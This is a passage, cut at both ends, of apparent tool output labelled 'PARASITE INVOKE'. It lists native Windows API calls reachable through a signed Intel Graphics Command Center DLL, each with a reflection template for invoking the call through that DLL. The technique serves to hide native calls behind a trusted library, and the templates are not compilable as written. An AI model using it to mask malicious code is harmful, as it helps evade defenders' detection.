        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr deviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, DEVPROPKEY& propertyKey, UInt32& propertyType, IntPtr propertyBuffer, uint propertyBufferSize, UInt32& requiredSize, uint flags });
        ===END SIGNATURE===

Method: SetupDiGetDeviceRegistryPropertyW
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceRegistryPropertyW"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr DeviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, uint Property, UInt32& PropertyRegDataType, IntPtr PropertyBuffer, uint PropertyBufferSize, UInt32& RequiredSize });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr lpInfoSet, uint dwIndex, SP_DEVINFO_DATA devInfoData });
        ===END SIGNATURE===

Method: SetupDiOpenDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiOpenDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr deviceInfoSet, IntPtr deviceInstanceId, IntPtr hwndParent, int openFlags, SP_DEVINFO_DATA deviceInfoData });
        ===END SIGNATURE===

Method: SetupDiGetDeviceRegistryProperty
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceRegistryProperty"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr DeviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, uint Property, UInt32& PropertyRegDataType, Byte[] PropertyBuffer, uint PropertyBufferSize, UInt32& RequiredSize });
        ===END SIGNATURE===

Method: SetupDiCreateDeviceInfoList
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiCreateDeviceInfoList"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { Guid ClassGuid, IntPtr hwndParent });
        ===END SIGNATURE===

Method: SetupDiDestroyDeviceInfoList
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiDestroyDeviceInfoList"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo });
        ===END SIGNATURE===

Method: CreateDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpszDriver, string lpszDevice, string lpszOutput, uint lpInitData });
        ===END SIGNATURE===

Method: DeleteDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DeleteDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc });
        ===END SIGNATURE===

Method: D3DKMTOpenAdapterFromHdc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTOpenAdapterFromHdc"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { D3DKMT_OPENADAPTERFROMHDC& Arg });
        ===END SIGNATURE===

Method: D3DKMTCloseAdapter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTCloseAdapter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { D3DKMT_CLOSEADAPTER& Arg });
        ===END SIGNATURE===

Method: D3DKMTEscape
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTEscape"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus) methodInfo.Invoke(null, new object[] { D3DKMT_ESCAPE& escapeData });
        ===END SIGNATURE===

Method: D3DKMTOpenAdapterFromDeviceName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTOpenAdapterFromDeviceName"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { D3DKMT_OPENADAPTERFROMDEVICENAME& deviceArgs });
        ===END SIGNATURE===

Method: D3DKMTQueryAdapterInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTQueryAdapterInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus) methodInfo.Invoke(null, new object[] { D3DKMT_QUERYADAPTERINFO& deviceArg });
        ===END SIGNATURE===

Method: LoadLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LoadLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string path });
        ===END SIGNATURE===

Method: GetProcAddress
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetProcAddress"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hModule, string procName });
        ===END SIGNATURE===

Method: FreeLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""FreeLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hModule });
        ===END SIGNATURE===

Method: LoadPackagedLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LoadPackagedLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string libFileName, uint Reserved });
        ===END SIGNATURE===

Method: SetDeviceGammaRamp
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDeviceGammaRamp"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDC, RAMP& lpRamp });
        ===END SIGNATURE===

Method: GetDeviceGammaRamp
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDeviceGammaRamp"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDC, RAMP& lpRamp });
        ===END SIGNATURE===

Method: GetDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hWnd });
        ===END SIGNATURE===

Method: ReleaseDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ReleaseDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, IntPtr hDC });
        ===END SIGNATURE===

Method: RegisterHotKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterHotKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int id, int fsModifiers, Keys vk });
        ===END SIGNATURE===

Method: UnregisterHotKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""UnregisterHotKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int id });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: SendMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SendMessage"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam });
        ===END SIGNATURE===

Method: RegisterWindowMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterWindowMessage"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { string lpString });
        ===END SIGNATURE===

Method: RegCloseKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCloseKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey });
        ===END SIGNATURE===

Method: RegQueryValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegQueryValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int lpReserved, Int32& type, IntPtr lpData, Int32& lpcbData });
        ===END SIGNATURE===

Method: RegQueryValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegQueryValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int lpReserved, Int32& type, StringBuilder lpData, Int32& lpcbData });
        ===END SIGNATURE===

Method: RegOpenKeyEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegOpenKeyEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string subKey, int ulOptions, uint samDesired, IntPtr& hkResult });
        ===END SIGNATURE===

Method: RegSetValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegSetValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int Reserved, RegistryValueKind dwType, IntPtr lpData, int cbData });
        ===END SIGNATURE===

Method: RegCreateKeyA
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCreateKeyA"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { uint hKey, string lpSubKey, IntPtr phkResult });
        ===END SIGNATURE===

Method: RegCreateKeyEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCreateKeyEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpSubKey, int Reserved, string lpClass, RegOption dwOptions, RegSAM samDesired, IntPtr lpSecurityAttributes, IntPtr& phkResult, RegResult& lpdwDisposition });
        ===END SIGNATURE===

Method: RegisterDeviceNotification
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterDeviceNotification"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, IntPtr NotificationFilter, uint Flags });
        ===END SIGNATURE===

Method: PowerSetActiveScheme
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerSetActiveScheme"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr UserPowerKey, Guid& ActivePolicyGuid });
        ===END SIGNATURE===

Method: PowerGetActiveScheme
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerGetActiveScheme"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr UserPowerKey, IntPtr& ActivePolicyGuid });
        ===END SIGNATURE===

Method: PowerReadFriendlyName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadFriendlyName"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr RootPowerKey, Guid& SchemeGuid, IntPtr SubGroupOfPowerSettingsGuid, IntPtr PowerSettingGuid, IntPtr Buffer, UInt32& BufferSize });
        ===END SIGNATURE===

Method: PowerReadDCValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadDCValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, UInt32& DcValueIndex });
        ===END SIGNATURE===

Method: PowerWriteDCValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerWriteDCValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, uint DcValueIndex });
        ===END SIGNATURE===

Method: PowerReadACValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadACValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, UInt32& DcValueIndex });
        ===END SIGNATURE===

Method: PowerWriteACValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerWriteACValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, uint DcValueIndex });
        ===END SIGNATURE===

Method: RegisterPowerSettingNotification
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterPowerSettingNotification"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, Guid& PowerSettingGuid, int Flags });
        ===END SIGNATURE===

Method: GetSystemPowerStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetSystemPowerStatus"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { SYSTEM_POWER_STATUS& systemPowerStatus });
        ===END SIGNATURE===

Method: clGetPlatformIDs
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformIDs"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { uint numEntries, PlatformID[] platforms, UInt32& numPlatforms });
        ===END SIGNATURE===

Method: clGetPlatformInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
